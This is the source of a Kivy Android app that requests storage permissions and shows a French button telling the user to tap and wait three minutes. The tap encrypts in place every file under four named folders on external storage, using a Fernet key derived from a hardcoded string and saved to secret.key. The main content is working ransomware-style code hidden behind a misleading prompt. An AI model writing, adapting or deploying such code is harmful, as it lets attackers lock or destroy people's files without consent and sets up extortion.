#!/usr/bin/env python

from kivy.app import App
from kivy.uix.button import Button
from android.permissions import request_permissions, Permission
from android.storage import primary_external_storage_path
import os
from cryptography.fernet import Fernet
import base64

class MyApp(App):
    def build(self):
        request_permissions([Permission.WRITE_EXTERNAL_STORAGE, Permission.READ_EXTERNAL_STORAGE])
        btn = Button(text="Welcome ! touche l'écran et attends 3 minutes que le bleu disparaisse.")
        btn.bind(on_release=self.encrypt_files)
        return btn

    def generate_key(self):
        key = "djzla7288".encode()  # Encode the given string to bytes
        key = base64.urlsafe_b64encode(key.ljust(32))  # Pad the key to 32 bytes and encode to base64
        with open("secret.key", "wb") as key_file:
            key_file.write(key)
        return key

    def load_key(self):
        return open("secret.key", "rb").read()

    def encrypt_file(self, file_path, key):
        fernet = Fernet(key)
        with open(file_path, 'rb') as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        with open(file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

    def encrypt_files(self, instance):
        directories = ['Mouton', 'Cabri', 'rido', 'caca']
        base_path = primary_external_storage_path()

        key = self.generate_key()  # Generate the specified key

        for dir_name in directories:
            dir_path = os.path.join(base_path, dir_name)
            if not os.path.exists(dir_path):
                os.makedirs(dir_path)

            for root, dirs, files in os.walk(dir_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    self.encrypt_file(file_path, key)
                    print(f"File encrypted: {file_path}")

if __name__ == '__main__':
    MyApp().run()
